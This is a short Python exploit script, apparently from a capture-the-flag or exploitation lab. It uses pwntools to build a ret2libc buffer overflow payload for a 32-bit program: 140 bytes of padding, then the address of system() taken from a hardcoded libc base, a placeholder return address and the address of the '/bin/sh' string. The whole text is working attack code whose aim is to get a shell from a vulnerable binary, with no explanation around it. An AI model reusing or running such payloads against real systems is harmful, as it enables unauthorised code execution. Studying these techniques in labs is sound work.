from pwn import *

payload = "A"*140

system = 0xf7dea000 + 0x3cd24
bin_sh = 0xf7dea000 + 0x17b8cf

payload += pack(system)
payload += pack(0xdeadbeef)
payload += pack(bin_sh)
print(payload)
